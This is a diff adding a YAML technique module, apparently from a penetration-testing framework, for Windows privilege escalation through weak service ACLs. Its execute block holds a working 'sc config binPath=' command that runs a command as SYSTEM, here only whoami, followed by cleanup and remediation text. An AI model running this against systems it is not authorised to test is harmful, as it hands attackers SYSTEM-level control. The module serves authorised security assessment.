@@ -1,0 +1,48 @@
+# Weak service ACL (SERVICE_CHANGE_CONFIG granted broadly) → SYSTEM
+#
+# A service's discretionary ACL grants SERVICE_CHANGE_CONFIG to a broad
+# principal (Users, Authenticated Users, a broad AD group). The
+# operator can `sc config binPath=` to any command; the SCM will run
+# that command as the service account (usually SYSTEM) on the next
+# start. Native — no payload to build; the binPath value IS the
+# command. Ported from privesc._d_win_weak_service.
+#
+# Emits ONE vector PER service in facts.reconfigurable_services via
+# per-item iteration.
+technique: T1574.011
+name: weak service perms ({{name}}) → SYSTEM
+tactic: [privilege-escalation]
+platform: [windows]
+key: 'weakservice:{{name}}'
+ranking:
+  exploitability: high            # one-shot sc config + sc start
+  safety: config-change           # rewrites binPath; cleanup restores it
+  detection: moderate              # sc config + service state change hit the event log
+detect:
+  reconfigurable_services: true    # value ignored — predicate iterates facts.reconfigurable_services
+execute:
+  # Repoint binPath to a whoami-into-proof command, restart the service
+  # so SCM invokes it as SYSTEM, wait for the payload to write, then
+  # read the proof back. The cleanup block below restores the original
+  # binPath — the operator MUST NOT skip cleanup or the service breaks.
+  command: 'sc config {{name}} binPath= "cmd /c whoami > {{stage}}\sc_{{slug}}.txt" & sc stop {{name}} >nul 2>&1 & sc start {{name}} >nul 2>&1 & ping -n 4 127.0.0.1 >nul & type {{stage}}\sc_{{slug}}.txt'
+verify:
+  success: "NT AUTHORITY"
+cleanup:
+  # Restore the captured binPath so the service works after — otherwise
+  # the exploit leaves the service running whoami on every start.
+  command: 'sc config {{name}} binPath= {{binpath}} & del {{stage}}\sc_{{slug}}.txt'
+report:
+  vector_type: weak_service_perms
+  evidence: "sc sdshow {{name}}: change-config granted to a broad principal"
+  description: >
+    The service ACL grants SERVICE_CHANGE_CONFIG (write-config) to a
+    broad principal — the operator can rewrite the binPath to any
+    command via `sc config`, restart the service, and have SCM run
+    that command as the service account (SYSTEM by default).
+  remediation: >
+    Tighten the service ACL: only SYSTEM + Administrators should hold
+    SERVICE_CHANGE_CONFIG. Audit with `sc sdshow <svc>` on every
+    service and grep the SDDL for broad principals (Users / Authenticated
+    Users / broad AD groups).
+  refs: [T1574.011, weak-service-permissions]
